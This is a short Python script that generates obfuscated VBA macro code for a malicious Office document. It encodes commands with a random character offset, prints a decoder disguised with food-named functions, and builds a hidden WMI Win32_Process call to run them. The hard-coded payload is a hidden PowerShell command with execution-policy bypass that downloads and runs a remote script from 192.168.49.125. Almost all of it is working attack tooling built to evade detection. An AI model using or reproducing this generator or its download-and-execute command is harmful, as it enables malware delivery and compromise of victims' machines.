#!/usr/bin/python

import random

def get_command():
    cmd = []
    print("[*] Input your command until enter \"done\"")
    while True:
        input_data = str(input())
        if input_data == "done":
            break
        else:
            cmd.append(input_data)
    return cmd

def caesar(cmd):
    result = []
    offset = random.randint(100, 700)
    print("[*] Generate offset " + str(offset))
    print("[*] Here is your decrypt code")
    print("""Function Pears(Beets)
    Pears = Chr(Beets - """ + str(offset) + """)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = Oatmilk
End Function""")
    def enc(cmd, offset):
        for i in cmd:
            for j in i:
                tmp = str(ord(j) + offset)
                if len(tmp) == 1:
                    tmp = "00" + tmp
                elif len(tmp) == 2:
                    tmp = "0" + tmp
                print(tmp, end='')
            print()
    fn = input('[?] Filename : ')
    enc(cmd, offset)
    print("[*] This 'winmgmts:' and 'Win32_Process'")
    enc(['winmgmts:', 'Win32_Process'], offset)
    print('GetObject(Nuts("")).Get(Nuts("")).Create Nuts(""), Tea, Coffee, Napkin')
    print("[*] Filename")
    enc([fn], offset)

caesar(['powershell -nop -w hidden -ep bypass IEX(IWR 192.168.49.125/dll.ps1 -UseBasicParsing)'])
